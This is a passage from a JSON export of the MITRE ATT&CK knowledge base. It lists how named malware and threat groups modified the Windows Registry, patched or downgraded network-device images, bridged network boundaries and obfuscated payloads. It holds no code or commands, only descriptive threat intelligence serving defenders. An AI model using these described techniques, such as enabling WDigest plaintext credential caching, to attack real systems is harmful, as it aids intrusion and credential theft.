Wocao", "description": "During Operation Wocao, the threat actors enabled Wdigest by changing the HKLM\\SYSTEM\\\\ControlSet001\\\\Control\\\\SecurityProviders\\\\WDigest registry value from 0 (disabled) to 1 (enabled)."}, {"id": "S0229", "name": "Orz", "description": "Orz can perform Registry operations."}, {"id": "S0664", "name": "Pandora", "description": "Pandora can write an encrypted token to the Registry to enable processing of remote commands."}, {"id": "G0040", "name": "Patchwork", "description": "A Patchwork payload deletes Resiliency Registry keys created by Microsoft Office applications in an apparent effort to trick users into thinking there were no issues during application runs."}, {"id": "S1050", "name": "PcShare", "description": "PcShare can delete its persistence mechanisms from the registry."}, {"id": "S0158", "name": "PHOREAL", "description": "PHOREAL is capable of manipulating the Registry."}, {"id": "S0517", "name": "Pillowmint", "description": "Pillowmint has modified the Registry key HKLM\\SOFTWARE\\Microsoft\\DRM to store a malicious payload."}, {"id": "S0501", "name": "PipeMon", "description": "PipeMon has modified the Registry to store its encrypted payload."}, {"id": "S0254", "name": "PLAINTEE", "description": "PLAINTEE uses reg add to add a Registry Run key for persistence."}, {"id": "S0013", "name": "PlugX", "description": "PlugX has a module to create, delete, or modify Registry keys."}, {"id": "S0428", "name": "PoetRAT", "description": "PoetRAT has made registry modifications to alter its behavior upon execution."}, {"id": "S0012", "name": "PoisonIvy", "description": "PoisonIvy creates a Registry subkey that registers a new system device."}, {"id": "S0518", "name": "PolyglotDuke", "description": "PolyglotDuke can write encrypted JSON configuration files to the Registry."}, {"id": "S0441", "name": "PowerShower", "description": "PowerShower has added a registry key so future powershell.exe instances are spawned off-screen by default, and has removed all registry entries that are left behind during the dropper process."}, {"id": "S1058", "name": "Prestige", "description": "Prestige has the ability to register new registry keys for a new extension handler via HKCR\\.enc and HKCR\\enc\\shell\\open\\command."}, {"id": "S0583", "name": "Pysa", "description": "Pysa has modified the registry key \"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" and added the ransom note."}, {"id": "S0650", "name": "QakBot", "description": "QakBot can modify the Registry to store its configuration information in a randomly named subkey under HKCU\\Software\\Microsoft."}, {"id": "S0269", "name": "QUADAGENT", "description": "QUADAGENT modifies an HKCU Registry key to store a session identifier unique to the compromised system as well as a pre-shared key used for encrypting and decrypting C2 communications."}, {"id": "S0262", "name": "QuasarRAT", "description": "QuasarRAT has a command to edit the Registry on the victim\u2019s machine."}, {"id": "S0662", "name": "RCSession", "description": "RCSession can write its configuration file to the Registry."}, {"id": "S0075", "name": "Reg", "description": "Reg may be used to interact with and modify the Windows Registry of a local or remote system at the command-line interface."}, {"id": "S0511", "name": "RegDuke", "description": "RegDuke can create seemingly legitimate Registry key to store its encryption key."}, {"id": "S0019", "name": "Regin", "description": "Regin appears to have functionality to modify remote Registry information."}, {"id": "S0332", "name": "Remcos", "description": "Remcos has full control of the Registry, including the ability to modify it."}, {"id": "S0496", "name": "REvil", "description": "REvil can modify the Registry to save encryption parameters and system information."}, {"id": "S0240", "name": "ROKRAT", "description": "ROKRAT can modify the HKEY_CURRENT_USER\\Software\\Microsoft\\Office\\ registry key so it can bypass the VB object model (VBOM) on a compromised host."}, {"id": "S0090", "name": "Rover", "description": "Rover has functionality to remove Registry Run key persistence as a cleanup procedure."}, {"id": "S0148", "name": "RTM", "description": "RTM can delete all Registry entries created during its execution."}, {"id": "G1031", "name": "Saint Bear", "description": "Saint Bear will leverage malicious Windows batch scripts to modify registry values associated with Windows Defender functionality."}, {"id": "S1099", "name": "Samurai", "description": "The Samurai loader component can create multiple Registry keys to force the svchost.exe process to load the final backdoor."}, {"id": "S0596", "name": "ShadowPad", "description": "ShadowPad can modify the Registry to store and maintain a configuration block and virtual file system."}, {"id": "S0140", "name": "Shamoon", "description": "Once Shamoon has access to a network share, it enables the RemoteRegistry service on the target system. It will then connect to the system with RegConnectRegistryW and modify the Registry to disable UAC remote restrictions by setting SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\LocalAccountTokenFilterPolicy to 1."}, {"id": "S0444", "name": "ShimRat", "description": "ShimRat has registered two registry keys for shim databases."}, {"id": "S0589", "name": "Sibot", "description": "Sibot has modified the Registry to install a second-stage script in the HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\sibot."}, {"id": "G0091", "name": "Silence", "description": "Silence can create, delete, or modify a specified Registry key or value."}, {"id": "S0692", "name": "SILENTTRINITY", "description": "SILENTTRINITY can modify registry keys, including to enable or disable Remote Desktop Protocol (RDP)."}, {"id": "S0533", "name": "SLOTHFULMEDIA", "description": "SLOTHFULMEDIA can add, modify, and/or delete registry keys. It has changed the proxy configuration of a victim system by modifying the HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap registry."}, {"id": "S0649", "name": "SMOKEDHAM", "description": "SMOKEDHAM has modified registry keys for persistence, to enable credential caching for credential access, and to facilitate lateral movement via RDP."}, {"id": "S0157", "name": "SOUNDBITE", "description": "SOUNDBITE is capable of modifying the Registry."}, {"id": "S0142", "name": "StreamEx", "description": "StreamEx has the ability to modify the Registry."}, {"id": "S0603", "name": "Stuxnet", "description": "Stuxnet can create registry keys to load driver files."}, {"id": "S0559", "name": "SUNBURST", "description": "SUNBURST had commands that allow an attacker to write or delete registry keys, and was observed stopping services by setting their HKLM\\SYSTEM\\CurrentControlSet\\services\\[service_name]\\Start registry entries to value 4. It also deleted previously-created Image File Execution Options (IFEO) Debugger registry values and registry keys related to HTTP proxy to clean up traces of its activity."}, {"id": "S0242", "name": "SynAck", "description": "SynAck can manipulate Registry keys."}, {"id": "S0663", "name": "SysUpdate", "description": "SysUpdate can write its configuration file to Software\\Classes\\scConfig in either HKEY_LOCAL_MACHINE or HKEY_CURRENT_USER."}, {"id": "G0092", "name": "TA505", "description": "TA505 has used malware to disable Windows Defender through modification of the Registry."}, {"id": "S0011", "name": "Taidoor", "description": "Taidoor has the ability to modify the Registry on compromised hosts using RegDeleteValueA and RegCreateKeyExA."}, {"id": "S0467", "name": "TajMahal", "description": "TajMahal can set the KeepPrintedJobs attribute for configured printers in SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Print\\Printers to enable document stealing."}, {"id": "S1011", "name": "Tarrask", "description": "Tarrask is able to delete the Security Descriptor (SD) registry subkey in order to \"hide\" scheduled tasks."}, {"id": "S0560", "name": "TEARDROP", "description": "TEARDROP modified the Registry to create a Windows service for itself on a compromised host."}, {"id": "G0027", "name": "Threat Group-3390", "description": "A Threat Group-3390 tool has created new Registry keys under HKEY_CURRENT_USER\\Software\\Classes\\ and HKLM\\SYSTEM\\CurrentControlSet\\services."}, {"id": "S0665", "name": "ThreatNeedle", "description": "ThreatNeedle can modify the Registry to save its configuration data as the following RC4-encrypted Registry key: HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\GameCon."}, {"id": "S0668", "name": "TinyTurla", "description": "TinyTurla can set its configuration parameters in the Registry."}, {"id": "S0266", "name": "TrickBot", "description": "TrickBot can modify registry entries."}, {"id": "G0010", "name": "Turla", "description": "Turla has modified Registry values to store payloads."}, {"id": "S0263", "name": "TYPEFRAME", "description": "TYPEFRAME can install encrypted configuration data under the Registry key HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\ShellCompatibility\\Applications\\laxhost.dll and HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\PrintConfigs."}, {"id": "S0022", "name": "Uroburos", "description": "Uroburos can store configuration information in the Registry including the initialization vector and AES key needed to find and decrypt other Uroburos components."}, {"id": "S0386", "name": "Ursnif", "description": "Ursnif has used Registry modifications as part of its installation routine."}, {"id": "S0476", "name": "Valak", "description": "Valak has the ability to modify the Registry key HKCU\\Software\\ApplicationContainer\\Appsw64 to store information regarding the C2 server and downloads."}, {"id": "S0180", "name": "Volgmer", "description": "Volgmer modifies the Registry to store an encoded configuration file in HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Security."}, {"id": "G1017", "name": "Volt Typhoon", "description": "Volt Typhoon has used netsh to create a PortProxy Registry modification on a compromised server running the Paessler Router Traffic Grapher (PRTG)."}, {"id": "S0670", "name": "WarzoneRAT", "description": "WarzoneRAT can create HKCU\\Software\\Classes\\Folder\\shell\\open\\command as a new registry key during privilege escalation."}, {"id": "S0612", "name": "WastedLocker", "description": "WastedLocker can modify registry values within the Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap registry key."}, {"id": "S0579", "name": "Waterbear", "description": "Waterbear has deleted certain values from the Registry to load a malicious DLL."}, {"id": "G0102", "name": "Wizard Spider", "description": "Wizard Spider has modified the Registry key HKLM\\System\\CurrentControlSet\\Control\\SecurityProviders\\WDigest by setting the UseLogonCredential registry value to 1 in order to force credentials to be stored in clear text in memory. Wizard Spider has also modified the WDigest registry key to allow plaintext credentials to be cached in memory."}, {"id": "S0330", "name": "Zeus Panda", "description": "Zeus Panda modifies several Registry keys under HKCU\\Software\\Microsoft\\Internet Explorer\\ PhishingFilter\\ to disable phishing filters."}, {"id": "S0350", "name": "zwShell", "description": "zwShell can modify the Registry."}, {"id": "S0412", "name": "ZxShell", "description": "ZxShell can create Registry entries to enable services to run."}], "sub_techniques": []}, {"name": "Modify System Image", "description": "Adversaries may make changes to the operating system of embedded network devices to weaken defenses and provide new capabilities for themselves.  On such devices, the operating systems are typically monolithic and most of the device functionality and capabilities are contained within a single file.", "detailed_description": "Adversaries may make changes to the operating system of embedded network devices to weaken defenses and provide new capabilities for themselves.  On such devices, the operating systems are typically monolithic and most of the device functionality and capabilities are contained within a single file.\nTo change the operating system, the adversary typically only needs to affect this one file, replacing or modifying it.  This can either be done live in memory during system runtime for immediate effect, or in storage to implement the change on the next boot of the network device.", "id": "T1601", "examples": [], "sub_techniques": [{"name": "Patch System Image", "description": "Adversaries may modify the operating system of a network device to introduce new capabilities or weaken existing defenses.     Some network devices are built with a monolithic architecture, where the entire operating system and most of the functionality of the device is contained within a single file.  Adversaries may change this file in storage, to be loaded in a future boot, or in memory during runtime.", "detailed_description": "Adversaries may modify the operating system of a network device to introduce new capabilities or weaken existing defenses.     Some network devices are built with a monolithic architecture, where the entire operating system and most of the functionality of the device is contained within a single file.  Adversaries may change this file in storage, to be loaded in a future boot, or in memory during runtime.\nTo change the operating system in storage, the adversary will typically use the standard procedures available to device operators. This may involve downloading a new file via typical protocols used on network devices, such as TFTP, FTP, SCP, or a console connection.  The original file may be overwritten, or a new file may be written alongside of it and the device reconfigured to boot to the compromised image.\nTo change the operating system in memory, the adversary typically can use one of two methods. In the first, the adversary would make use of native debug commands in the original, unaltered running operating system that allow them to directly modify the relevant memory addresses containing the running operating system.  This method typically requires administrative level access to the device.\nIn the second method for changing the operating system in memory, the adversary would make use of the boot loader. The boot loader is the first piece of software that loads when the device starts that, in turn, will launch the operating system.  Adversaries may use malicious code previously implanted in the boot loader, such as through the ROMMONkit method, to directly manipulate running operating system code in memory.  This malicious code in the bootloader provides the capability of direct memory manipulation to the adversary, allowing them to patch the live operating system during runtime.\nBy modifying the instructions stored in the system image file, adversaries may either weaken existing defenses or provision new capabilities that the device did not have before. Examples of existing defenses that can be impeded include encryption, via Weaken Encryption, authentication, via Network Device Authentication, and perimeter defenses, via Network Boundary Bridging.  Adding new capabilities for the adversary\u2019s purpose include Keylogging, Multi-hop Proxy, and Port Knocking.\nAdversaries may also compromise existing commands in the operating system to produce false output to mislead defenders.   When this method is used in conjunction with Downgrade System Image, one example of a compromised system command may include changing the output of the command that shows the version of the currently running operating system.  By patching the operating system, the adversary can change this command to instead display the original, higher revision number that they replaced through the system downgrade.\nWhen the operating system is patched in storage, this can be achieved in either the resident storage (typically a form of flash memory, which is non-volatile) or via TFTP Boot.\nWhen the technique is performed on the running operating system in memory and not on the stored copy, this technique will not survive across reboots.  However, live memory modification of the operating system can be combined with ROMMONkit to achieve persistence.", "id": "T1601.001", "examples": [{"id": "S0519", "name": "SYNful Knock", "description": "SYNful Knock is malware that is inserted into a network device by patching the operating system image."}]}, {"name": "Downgrade System Image", "description": "Adversaries may install an older version of the operating system of a network device to weaken security.  Older operating system versions on network devices often have weaker encryption ciphers and, in general, fewer/less updated defensive features. ", "detailed_description": "Adversaries may install an older version of the operating system of a network device to weaken security.  Older operating system versions on network devices often have weaker encryption ciphers and, in general, fewer/less updated defensive features. \nOn embedded devices, downgrading the version typically only requires replacing the operating system file in storage.  With most embedded devices, this can be achieved by downloading a copy of the desired version of the operating system file and reconfiguring the device to boot from that file on next system restart.  The adversary could then restart the device to implement the change immediately or they could wait until the next time the system restarts.\nDowngrading the system image to an older versions may allow an adversary to evade defenses by enabling behaviors such as Weaken Encryption.  Downgrading of a system image can be done on its own, or it can be used in conjunction with Patch System Image.", "id": "T1601.002", "examples": []}]}, {"name": "Network Boundary Bridging", "description": "Adversaries may bridge network boundaries by compromising perimeter network devices or internal devices responsible for network segmentation. Breaching these devices may enable an adversary to bypass restrictions on traffic routing that otherwise separate trusted and untrusted networks.", "detailed_description": "Adversaries may bridge network boundaries by compromising perimeter network devices or internal devices responsible for network segmentation. Breaching these devices may enable an adversary to bypass restrictions on traffic routing that otherwise separate trusted and untrusted networks.\nDevices such as routers and firewalls can be used to create boundaries between trusted and untrusted networks.  They achieve this by restricting traffic types to enforce organizational policy in an attempt to reduce the risk inherent in such connections.  Restriction of traffic can be achieved by prohibiting IP addresses, layer 4 protocol ports, or through deep packet inspection to identify applications.  To participate with the rest of the network, these devices can be directly addressable or transparent, but their mode of operation has no bearing on how the adversary can bypass them when compromised.\nWhen an adversary takes control of such a boundary device, they can bypass its policy enforcement to pass normally prohibited traffic across the trust boundary between the two separated networks without hinderance.  By achieving sufficient rights on the device, an adversary can reconfigure the device to allow the traffic they want, allowing them to then further achieve goals such as command and control via Multi-hop Proxy or exfiltration of data via Traffic Duplication. Adversaries may also target internal devices responsible for network segmentation and abuse these in conjunction with Internal Proxy to achieve the same goals.  In the cases where a border device separates two separate organizations, the adversary can also facilitate lateral movement into new victim environments.", "id": "T1599", "examples": [{"id": "G0096", "name": "APT41", "description": "APT41 used NATBypass to bypass firewall restrictions and to access compromised systems via RDP."}], "sub_techniques": [{"name": "Network Address Translation Traversal", "description": "Adversaries may bridge network boundaries by modifying a network device\u2019s Network Address Translation (NAT) configuration. Malicious modifications to NAT may enable an adversary to bypass restrictions on traffic routing that otherwise separate trusted and untrusted networks.", "detailed_description": "Adversaries may bridge network boundaries by modifying a network device\u2019s Network Address Translation (NAT) configuration. Malicious modifications to NAT may enable an adversary to bypass restrictions on traffic routing that otherwise separate trusted and untrusted networks.\nNetwork devices such as routers and firewalls that connect multiple networks together may implement NAT during the process of passing packets between networks. When performing NAT, the network device will rewrite the source and/or destination addresses of the IP address header. Some network designs require NAT for the packets to cross the border device.  A typical example of this is environments where internal networks make use of non-Internet routable addresses.\nWhen an adversary gains control of a network boundary device, they can either leverage existing NAT configurations to send traffic between two separated networks, or they can implement NAT configurations of their own design.  In the case of network designs that require NAT to function, this enables the adversary to overcome inherent routing limitations that would normally prevent them from accessing protected systems behind the border device.  In the case of network designs that do not require NAT, address translation can be used by adversaries to obscure their activities, as changing the addresses of packets that traverse a network boundary device can make monitoring data transmissions more challenging for defenders.\nAdversaries may use Patch System Image to change the operating system of a network device, implementing their own custom NAT mechanisms to further obscure their activities", "id": "T1599.001", "examples": []}]}, {"name": "Obfuscated Files or Information", "description": "Adversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit. This is common behavior that can be used across different platforms and the network to evade defenses.", "detailed_description": "Adversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit. This is common behavior that can be used across different platforms and the network to evade defenses.\nPayloads may be compressed, archived, or encrypted in order to avoid detection. These payloads may be used during Initial Access or later to mitigate detection. Sometimes a user's action may be required to open and Deobfuscate/Decode Files or Information for User Execution. The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary.  Adversaries may also use compressed or archived scripts, such as JavaScript.\nPortions of files can also be encoded to hide the plain-text strings that would otherwise help defenders with discovery.  Payloads may also be split into separate, seemingly benign files that only reveal malicious functionality when reassembled.\nAdversaries may also abuse Command Obfuscation to obscure commands executed from payloads or directly via Command and Scripting Interpreter. Environment variables, aliases, characters, and other platform/language specific semantics can be used to evade signature based detections and application control mechanisms.", "id": "T1027", "examples": [{"id": "C0025", "name": "2016 Ukraine Electric Power Attack", "description": "During the 2016 Ukraine Electric Power Attack, Sandworm Team used heavily obfuscated code with Industroyer in its Windows Notepad backdoor."}, {"id": "S1028", "name": "Action RAT", "description": "Action RAT's commands, strings, and domains can be Base64 encoded within the payload."}, {"id": "S0045", "name": "ADVSTORESHELL", "description": "Most of the strings in ADVSTORESHELL are encrypted with an XOR-based algorithm; some strings are also encrypted with 3DES and reversed. API function names are also reversed, presumably to avoid detection in memory."}, {"id": "S0331", "name": "Agent Tesla", "description": "Agent Tesla has had its code obfuscated in an apparent attempt to make analysis difficult. Agent Tesla has used the Rijndael symmetric encryption algorithm to encrypt strings."}, {"id": "S1025", "name": "Amadey", "description": "Amadey has obfuscated strings such as antivirus vendor names, domains, files, and others."}, {"id": "S0504", "name": "Anchor", "description": "Anchor has obfuscated code with stack strings and string encryption."}, {"id": "S0584", "name": "AppleJeus", "description": "AppleJeus has XOR-encrypted collected system information prior to sending to a C2. AppleJeus has also used the open source ADVObfuscation library for its components."}, {"id": "S0622", "name": "AppleSeed", "description": "AppleSeed has the ability to Base64 encode its payload and custom encrypt API calls."}, {"id": "G0099", "name": "APT-C-36", "description": "APT-C-36 has used ConfuserEx to obfuscate its variant of Imminent Monitor, compressed payload and RAT packages, and password protected encrypted email attachments to avoid detection."}, {"id": "G0022", "name": "APT3", "description": "APT3 obfuscates files or information to help evade defensive measures."}, {"id": "G0067", "name": "APT37", "description": "APT37 obfuscates strings and payloads."}, {"id": "G0096", "name": "APT41", "description": "APT41 used VMProtected binaries in multiple intrusions."}, {"id": "S0640", "name": "Avaddon", "description": "Avaddon has used encrypted strings."}, {"id": "S1053", "name": "AvosLocker", "description": "AvosLocker has used XOR-encoded strings."}, {"id": "G0135", "name": "BackdoorDiplomacy", "description": "BackdoorDiplomacy has obfuscated tools and malware it uses with VMProtect."}, {"id": "G0063", "name": "BlackOasis", "description": "BlackOasis's first stage shellcode contains a NOP sled with alternative instructions that was likely designed to bypass antivirus tools."}, {"id": "S0635", "name": "BoomBox", "description": "BoomBox can encrypt data using AES prior to exfiltration."}, {"id": "S0651", "name": "BoxCaon", "description": "BoxCaon used the \"StackStrings\" obfuscation technique to hide malicious functionalities."}, {"id": "S1161", "name": "BPFDoor", "description": "BPFDoor can require a password to activate the backdoor and uses RC4 encryption or static library encryption libtomcrypt."}, {"id": "S1063", "name": "Brute Ratel C4", "description": "Brute Ratel C4 has used encrypted payload files and maintains an encrypted configuration structure in memory."}, {"id": "S1039", "name": "Bumblebee", "description": "Bumblebee has been delivered as password-protected zipped ISO files and used control-flow-flattening to obfuscate the flow of functions."}, {"id": "S0482", "name": "Bundlore", "description": "Bundlore has obfuscated data with base64, AES, RC4, and bz2."}, {"id": "S1118", "name": "BUSHWALK", "description": "BUSHWALK can encrypt the resulting data generated from C2 commands with RC4."}, {"id": "C0015", "name": "C0015", "description": "During C0015, the threat actors used Base64-encoded strings."}, {"id": "C0017", "name": "C0017", "description": "During C0017, APT41 broke malicious binaries, including DEADEYE and KEYPLUG, into multiple sections on disk to evade detection."}, {"id": "S0030", "name": "Carbanak", "description": "Carbanak encrypts strings to make analysis more difficult."}, {"id": "S0335", "name": "Carbon", "description": "Carbon encrypts configuration files and tasks for the malware to complete using CAST-128 algorithm."}, {"id": "S0465", "name": "CARROTBALL", "description": "CARROTBALL has used a custom base64 alphabet to decode files."}, {"id": "S1149", "name": "CHIMNEYSWEEP", "description": "CHIMNEYSWEEP can use a custom Base64 alphabet to encode an API decryption key."}, {"id": "S0660", "name": "Clambling", "description": "The Clambling executable has been obfuscated when dropped on a compromised host."}, {"id": "S1105", "name": "COATHANGER", "description": "COATHANGER can store obfuscated configuration information in the last 56 bytes of the file /date/.bd.key/preload.so."}, {"id": "S0154", "name": "Cobalt Strike", "description": "Cobalt Strike can hash functions to obfuscate calls to the Windows API and use a public/private key pair to encrypt Beacon session metadata."}, {"id": "S0369", "name": "CoinTicker", "description": "CoinTicker initially downloads a hidden encoded file."}, {"id": "S0244", "name": "Comnie", "description": "Comnie uses RC4 and Base64 to obfuscate strings."}, {"id": "S0126", "name": "ComRAT", "description": "ComRAT has encrypted its virtual file system using AES-256 in XTS mode."}, {"id": "S0608", "name": "Conficker", "description": "Conficker has obfuscated its code to prevent its removal from host machines."}, {"id": "S0575", "name": "Conti", "description": "Conti can use compiler-based obfuscation for its code, encrypt DLLs, and hide Windows API calls."}, {"id": "S0137", "name": "CORESHELL", "description": "CORESHELL obfuscates strings using a custom stream cipher."}, {"id": "S0625", "name": "Cuba", "description": "Cuba has used multiple layers of obfuscation to avoid analysis, including its Base64 encoded payload."}, {"id": "S1111", "name": "DarkGate", "description": "DarkGate uses a hard-coded string as a seed, along with the victim machine hardware identifier and input text, to generate a unique string used as an internal mutex value to evade static detection based on mutexes."}, {"id": "S1066", "name": "DarkTortilla", "description": "DarkTortilla has been obfuscated with the DeepSea .NET and ConfuserEx code obfuscators."}, {"id": "S0187", "name": "Daserf", "description": "Daserf uses encrypted Windows APIs and also encrypts data using the alternative base64+RC4 or the Caesar cipher."}, {"id": "S0354", "name": "Denis", "description": "Denis obfuscates its code and encrypts the API names."}, {"id": "S0659", "name": "Diavol", "description": "Diavol has Base64 encoded the RSA public key used for encrypting files."}, {"id": "S0695", "name": "Donut", "description": "Donut can generate encrypted, compressed/encoded, or otherwise obfuscated code modules."}, {"id": "S0694", "name": "DRATzarus", "description": "DRATzarus can be partly encrypted with XOR."}, {"id": "S0384", "name": "Dridex", "description": "Dridex's strings are obfuscated using RC4."}, {"id": "S0502", "name": "Drovorub", "description": "Drovorub has used XOR encrypted payloads in WebSocket client to server messages."}, {"id": "S0062", "name": "DustySky", "description": "The DustySky dropper uses a function to obfuscate the name of functions and other parts of the malware."}, {"id": "G1006", "name": "Earth Lusca", "description": "Earth Lusca used Base64 to encode strings."}, {"id": "S0377", "name": "Ebury", "description": "Ebury has obfuscated its strings with a simple XOR encryption with a static key."}, {"id": "S0593", "name": "ECCENTRICBANDWAGON", "description": "ECCENTRICBANDWAGON has encrypted strings with RC4."}, {"id": "S0624", "name": "Ecipekac", "description": "Ecipekac can use XOR, AES, and DES to encrypt loader shellcode."}, {"id": "S0605", "name": "EKANS", "description": "EKANS uses encoded strings in its process kill list."}, {"id": "S0091", "name": "Epic", "description": "Epic heavily obfuscates its code to make analysis more difficult."}, {"id": "S0512", "name": "FatDuke", "description": "FatDuke can use base64 encoding, string stacking, and opaque predicates for obfuscation."}, {"id": "S0355", "name": "Final1stspy", "description": "Final1stspy obfuscates strings with base64 encoding."}, {"id": "S0182", "name": "FinFisher", "description": "FinFisher is heavily obfuscated in many ways, including through the use of spaghetti code in its functions in an effort to confuse disassembly programs. It also uses a custom XOR algorithm to obfuscate code."}, {"id": "S0696", "name": "Flagpro", "description": "Flagpro has been delivered within ZIP or RAR password-protected archived files."}, {"id": "G0093", "name": "GALLIUM", "description": "GALLIUM used a modified version of HTRAN in which they obfuscated strings such as debug messages in an apparent attempt to evade detection."}, {"id": "G0084", "name": "Gallmaker", "description": "Gallmaker obfuscated shellcode used during execution."}, {"id": "G0047", "name": "Gamaredon Group", "description": "Gamaredon Group has delivered self-extracting 7z archive files within malicious document attachments."}, {"id": "S0477", "name": "Goopy", "description": "Goopy's decrypter have been inflated with junk code in between legitimate API functions, and also included infinite loops to avoid analysis."}, {"id": "S1138", "name": "Gootloader", "description": "The Gootloader first stage script is obfuscated using random alpha numeric strings."}, {"id": "S0690", "name": "Green Lambert", "description": "Green Lambert has encrypted strings."}, {"id": "S0632", "name": "GrimAgent", "description": "GrimAgent has used Rotate on Right (RoR) and Rotate on Left (RoL) functionality to encrypt strings."}, {"id": "S0132", "name": "H1N1", "description": "H1N1 uses multiple techniques to obfuscate strings, including XOR."}, {"id": "S0499", "name": "Hancitor", "description": "Hancitor has used Base64 to encode malicious links. Hancitor has also delivered compressed payloads in ZIP files to victims."}, {"id": "S0070", "name": "HTTPBrowser", "description": "HTTPBrowser's code may be obfuscated through structured exception handling and return-oriented programming."}, {"id": "S0203", "name": "Hydraq", "description": "Hydraq uses basic obfuscation in the form of spaghetti code."}, {"id": "S0434", "name": "Imminent Monitor", "description": "Imminent Monitor has encrypted the spearphish attachments to avoid detection from email gateways; the debugger also encrypts information before sending to the C2."}, {"id": "S0604", "name": "Industroyer", "description": "Industroyer uses heavily obfuscated code in its Windows Notepad backdoor."}, {"id": "S0259", "name": "InnaputRAT", "description": "InnaputRAT uses an 8-byte XOR key to obfuscate API names and other strings contained in the payload."}, {"id": "S0260", "name": "InvisiMole", "description": "InvisiMole avoids analysis by encrypting all strings, internal files, configuration data and by using a custom executable format."}, {"id": "S0189", "name": "ISMInjector", "description": "ISMInjector is obfuscated with the off-the-shelf SmartAssembly .NET obfuscator created by red-gate.com."}, {"id": "S0201", "name": "JPIN", "description": "A JPIN uses a encrypted and compressed payload that is disguised as a bitmap within the resource section of the installer."}, {"id": "S0283", "name": "jRAT", "description": "jRAT\u2019s Java payload is encrypted with AES. Additionally, backdoor files are encrypted using DES as a stream cipher. Later variants of jRAT also incorporated AV evasion methods such as Java bytecode obfuscation via the commercial Allatori obfuscation tool."}, {"id": "S0265", "name": "Kazuar", "description": "Kazuar is obfuscated using the open source ConfuserEx protector. Kazuar also obfuscates the name of created files/folders/mutexes and encrypts debug messages written to log files using the Rijndael cipher."}, {"id": "G0004", "name": "Ke3chang", "description": "Ke3chang has used Base64-encoded shellcode strings."}, {"id": "S0585", "name": "Kerrdown", "description": "Kerrdown can encrypt, encode, and compress multiple layers of shellcode."}, {"id": "S0607", "name": "KillDisk", "description": "KillDisk uses VMProtect to make reverse engineering the malware more difficult."}, {"id": "G0094", "name": "Kimsuky", "description": "Kimsuky has obfuscated binary strings including the use of XOR encryption and Base64 encoding. Kimsuky has also modified the first byte of DLL implants targeting victims to prevent recognition of the executable file format."}, {"id": "S0641", "name": "Kobalos", "description": "Kobalos encrypts all strings using RC4 and bundles all functionality into a single function call."}, {"id": "S0447", "name": "Lokibot", "description": "Lokibot has obfuscated strings with base64 encoding."}, {"id": "S0167", "name": "Matryoshka", "description": "Matryoshka obfuscates API function names using a substitute cipher combined with Base64 encoding."}, {"id": "S0449", "name": "Maze", "description": "Maze has decrypted strings and other important information during the encryption process. Maze also calls certain functions dynamically to hinder analysis."}, {"id": "S0500", "name": "MCMD", "description": "MCMD can Base64 encode output strings prior to sending to C2."}, {"id": "S0051", "name": "MiniDuke", "description": "MiniDuke can use control flow flattening to obscure code."}, {"id": "G1036", "name": "Moonstone Sleet", "description": "Moonstone Sleet delivers encrypted payloads in pieces that are then combined together to form a new portable executable (PE) file during installation."}, {"id": "G0129", "name": "Mustang Panda", "description": "Mustang Panda has delivered initial payloads hidden using archives and encoding measures."}, {"id": "S0336", "name": "NanoCore", "description": "NanoCore\u2019s plugins were obfuscated with Eazfuscater.NET 3.3."}, {"id": "S0198", "name": "NETWIRE", "description": "NETWIRE has used a custom obfuscation algorithm to hide strings including Registry keys, APIs, and DLL names."}, {"id": "S1090", "name": "NightClub", "description": "NightClub can obfuscate strings using the congruential generator (LCG): staten+1 = (690069 \u00d7 staten + 1) mod 232."}, {"id": "S0353", "name": "NOKKI", "description": "NOKKI uses Base64 encoding for strings."}, {"id": "S0138", "name": "OLDBAIT", "description": "OLDBAIT obfuscates internal strings and unpacks them at startup."}, {"id": "S0264", "name": "OopsIE", "description": "OopsIE uses the Confuser protector to obfuscate an embedded .Net Framework assembly used for C2. OopsIE also encodes collected data in hexadecimal format before writing to files on disk and obfuscates strings."}, {"id": "S0229", "name": "Orz", "description": "Some Orz strings are base64 encoded, such as the embedded DLL known as MockDll."}, {"id": "S0594", "name": "Out1", "description": "Out1 has the ability to encode data."}, {"id": "S0598", "name": "P.A.S. Webshell", "description": "P.A.S. Webshell can use encryption and base64 encoding to hide strings and to enforce access control once deployed."}, {"id": "S0664", "name": "Pandora", "description": "Pandora has the ability to compress stings with QuickLZ."}, {"id": "S0517", "name": "Pillowmint", "description": "Pillowmint has been compressed and stored within a registry key. Pillowmint has also obfuscated the AES key used for encryption."}, {"id": "S0124", "name": "Pisloader", "description": "Pisloader obfuscates files by splitting strings into smaller sub-strings and including \"garbage\" strings that are never used. The malware also uses return-oriented programming (ROP) technique and single-byte XOR to obfuscate data."}, {"id": "S0013", "name": "PlugX", "description": "PlugX can use API hashing and modify the names of strings to evade detection."}, {"id": "S0428", "name": "PoetRAT", "description": "PoetRAT has used a custom encryption scheme for communication between scripts."}, {"id": "S0012", "name": "PoisonIvy", "description": "PoisonIvy hides any strings related to its own indicators of compromise."}, {"id": "S0518", "name": "PolyglotDuke", "description": "PolyglotDuke can custom encrypt strings."}, {"id": "S0453", "name": "Pony", "description": "Pony attachments have been delivered via compressed archive files. Pony also obfuscates the memory flow by adding junk instructions when executing to make analysis more difficult."}, {"id": "S0150", "name": "POSHSPY", "description": "POSHSPY appends a file signature header (randomly selected from six file types) to encrypted data prior to upload or download."}, {"id": "S0393", "name": "PowerStallion", "description": "PowerStallion uses a XOR cipher to encrypt command output written to its OneDrive C2 server."}, {"id": "S0196", "name": "PUNCHBUGGY", "description": "PUNCHBUGGY has hashed most its code's functions and encrypted payloads with base64 and XOR."}, {"id": "S0197", "name": "PUNCHTRACK", "description": 